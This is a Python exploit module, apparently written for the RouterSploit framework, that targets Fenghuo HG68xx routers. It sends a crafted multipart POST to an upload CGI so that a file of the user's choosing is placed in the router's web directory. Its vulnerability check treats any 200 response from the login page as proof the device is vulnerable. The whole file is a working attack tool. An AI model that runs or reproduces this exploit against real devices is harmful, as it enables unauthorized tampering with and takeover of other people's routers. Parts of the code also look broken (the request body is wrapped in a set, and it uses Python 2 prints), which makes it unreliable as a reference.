from routersploit import (
    exploits,
    print_status,
    print_error,
    print_success,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """ Exploit fenghuo cat exists arbitrary upload vulnerability """
    __info__ = {
        'name': 'Fenghuo HG68xx Upload',
        'authors': [
            'mosin',  # vulnerability discovery
            'hucmoxing@163.com',  # routersploit module
        ],
        'description': 'Module  Exploit fenghuo cat exists arbitrary upload vulnerability ! ',
        'references': [
            '',
        ],
        'devices': [
            'HG-6xxx',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')
    datas = exploits.Option('','upload filepath')
    filename = exploits.Option('test.html','upload filename')
    
    def run(self):
        if self.check():
            if self.datas:
                da = open(self.datas).read()
            else:
                da = 'test'
            url = "{}:{}/cgi-bin/uploadfile.htm.cgi".format(self.target, self.port)
            headers = {u'Content-Type': u'application/x-www-form-urlencoded',
                       u'Accept': 'text/html, application/xhtml+xml, */*',
                       u'Referer': 'http://192.168.1.1/index_main_CM',
                       u'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                       u'Content-Type': 'multipart/form-data; boundary=---------------------------7e111b261c036e'}
            
            data = {'''
            -----------------------------7e111b261c036e
            Content-Disposition: form-data; name="uploadfile"; filename="{}"
            Content-Type: text/html

            {}
            -----------------------------7e111b261c036e
            Content-Disposition: form-data; name="uploadpath"

            /var/WEB-GUI/
            -----------------------------7e111b261c036e
            Content-Disposition: form-data; name="submit"

            0000
            -----------------------------7e111b261c036e--'''.format(self.filename,da)
            }

            print_status("Sending file data request")
            response = http_request(method="POST", url=url, headers=headers, data=data)

            if response.status_code == 200:
                print "file upload access to {}:{}/WEB-GUI/{}".format(self.target,self.port,self.filename)
            else:
                print_error("Exploit failed - could not upload")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/cgi-bin/login_CM.htm.cgi".format(self.target, self.port)
        response = http_request(method="GET", url=url)
        
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200:
            return True  # target is vulnerable

        return False  # target not vulnerable
